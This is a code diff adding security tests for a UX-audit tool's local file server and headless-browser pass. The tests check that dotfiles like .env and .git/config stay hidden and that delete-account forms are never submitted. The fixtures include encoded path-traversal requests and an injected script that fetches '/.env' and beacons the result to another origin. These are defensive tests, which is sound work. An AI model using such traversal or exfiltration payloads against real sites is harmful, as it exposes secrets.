@@ -13,7 +13,7 @@ import { FIXED_TS, FIXTURES_DIR, SKILL_DIR, chromiumAvailable, tempDir, withServ
 import { auditRuntimeUx } from '../../plugins/atelier/skills/runtime-ux-audit/index.mjs';
 import { emptyFacts, runDynamicPass } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/index.mjs';
 import { summarizeInteractions } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/inp.mjs';
-import { contentTypeFor, startServer } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/serve.mjs';
+import { contentTypeFor, hasHiddenSegment, startServer } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/serve.mjs';
 import { LAUNCH_OPTIONS, cleanEntries, cleanLoaf, cleanSweep, errorMessage } from '../../plugins/atelier/skills/runtime-ux-audit/dynamic/probes.mjs';
 import { UxAuditError } from '../../plugins/atelier/skills/runtime-ux-audit/lib/errors.mjs';
 import { buildHtmlModel } from '../../plugins/atelier/skills/runtime-ux-audit/lib/html-model.mjs';
@@ -126,12 +126,18 @@ describe('loopback server (serve.mjs)', () => {
       'dir with space/caf\u00e9.js': 'var y = 2;',
       'data.bin': Buffer.from([1, 2, 3]),
       'sub/index.html': '<p>sub</p>',
+      '.env': 'TOKEN=secret-env',
+      '.git/config': 'url = https://token@example.com/repo.git',
+      '.well-known/x.json': '{"ok":true}',
+      'sub/.hidden/y.txt': 'hidden',
     });
     writeFileSync(join(tmp.dir, 'secret.txt'), 'top secret');
     mkdirSync(join(tmp.dir, 'outside'));
     writeFileSync(join(tmp.dir, 'outside', 'leak.txt'), 'leaked');
     try {
       symlinkSync(join(tmp.dir, 'outside'), join(site, 'link'), 'junction');
+      // A plainly named link into a dot folder.
+      symlinkSync(join(site, '.git'), join(site, 'gitlink'), 'junction');
       linked = true;
     } catch {
       linked = false;
@@ -190,6 +196,28 @@ describe('loopback server (serve.mjs)', () => {
     const res = await rawRequest(server.port, '/link/leak.txt');
     expect(res.status).toBe(404);
     expect(res.body).not.toContain('leaked');
+  });
+
+  it('never serves dot-named files or folders, except .well-known', async () => {
+    for (const path of ['/.env', '/%2eenv', '/.git/config', '/%2Egit/config', '/sub/.hidden/y.txt', '/sub/..%2f.env', '/sub%5C..%5C.env', '/a%5C.env']) {
+      const res = await rawRequest(server.port, path);
+      expect(res.status, path).toBe(404);
+      expect(res.body, path).not.toMatch(/secret-env|token@|hidden/);
+    }
+    const ok = await fetch(`${server.origin}/.well-known/x.json`);
+    expect(ok.status).toBe(200);
+    expect(await ok.json()).toEqual({ ok: true });
+    expect(hasHiddenSegment('a/.env')).toBe(true);
+    expect(hasHiddenSegment('a\\.git\\config')).toBe(true);
+    expect(hasHiddenSegment('.well-known/x')).toBe(false);
+    expect(hasHiddenSegment('css/site.css')).toBe(false);
+  });
+
+  it('refuses a plainly named link into a dot folder', async (ctx) => {
+    if (!linked) ctx.skip();
+    const res = await rawRequest(server.port, '/gitlink/config');
+    expect(res.status).toBe(404);
+    expect(res.body).not.toContain('token@');
   });
 
   it('only answers requests addressed to its own host', async () => {
@@ -541,6 +569,64 @@ describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
       cleanup();
     }
   }, 120_000);
+
+  it('never taps or opens a button that would submit a form', async () => {
+    const PAGE = '<!doctype html><meta name="viewport" content="width=device-width">'
+      + '<form method="post"><input type="hidden" name="action" value="delete-account"><button id="del">Delete my account</button></form>'
+      + '<form method="post"><button id="menu" aria-haspopup="dialog">Options</button></form>'
+      + '<form method="get"><input type="submit" id="search" value="Search"></form>'
+      + '<button id="safe" type="button">Safe</button>'
+      + '<dialog open><form method="dialog"><button id="close">Close</button></form></dialog>';
+    const requests = [];
+    await withServer((req, res) => {
+      requests.push(`${req.method} ${req.url}`);
+      req.resume();
+      res.writeHead(200, { 'content-type': 'text/html' });
+      res.end(req.method === 'GET' && req.url === '/' ? PAGE : '<p>done</p>');
+    }, async (base) => {
+      const out = await runDynamicPass({ page: { kind: 'http', url: `${base}/`, filePath: null, root: null }, limits: { settleMs: 100, maxTabs: 1, maxDialogTriggers: 3 } });
+      expect(requests.filter((r) => !r.startsWith('GET /'))).toEqual([]);
+      expect(requests.filter((r) => r.includes('?'))).toEqual([]);
+      expect(out.errors.filter((e) => /navigated-away/.test(e.message))).toEqual([]);
+      const tapped = out.interactions.attempted.map((a) => a.target);
+      expect(tapped).toEqual(expect.arrayContaining(['#safe', '#close']));
+      for (const id of ['#del', '#menu', '#search']) expect(tapped).not.toContain(id);
+      expect(JSON.stringify(out.dialogs ?? [])).not.toContain('#menu');
+    });
+  }, 120_000);
+
+  it('blocks a local page from reaching other origins unless they are allowed', async () => {
+    const hits = [];
+    await withServer((req, res) => {
+      hits.push(req.url);
+      res.writeHead(204);
+      res.end();
+    }, async (other) => {
+      const { dir, cleanup } = tempDir('ux-dyn-egress-');
+      try {
+        writeFiles(dir, {
+          'index.html': '<!doctype html><meta name="viewport" content="width=device-width"><p>x</p><script>'
+            + `fetch('/.env').then((r) => { new Image().src = '${other}/leak?env=' + r.status; });`
+            + `fetch('${other}/fetch').catch(() => {});</script>`,
+          '.env': 'TOKEN=secret',
+        });
+        const root = safeRealpath(dir);
+        const filePath = join(root, 'index.html');
+        const input = { page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root }, limits: { settleMs: 100, maxTabs: 1, maxTaps: 1, maxDialogTriggers: 1 } };
+        const blocked = await runDynamicPass(input);
+        expect(hits).toEqual([]);
+        const net = blocked.errors.filter((e) => e.probe === 'network');
+        expect(net).toHaveLength(1);
+        expect(net[0].message).toContain(other);
+        const allowed = await runDynamicPass({ ...input, allowOrigins: [other] });
+        // The dotfile itself is still refused by the loopback server.
+        expect(hits).toEqual(expect.arrayContaining(['/fetch', '/leak?env=404']));
+        expect(allowed.errors.filter((e) => e.probe === 'network')).toEqual([]);
+      } finally {
+        cleanup();
+      }
+    });
+  }, 180_000);
 
   it('records a failed navigation and skips the page probes', async () => {
     const port = await new Promise((resolve) => {
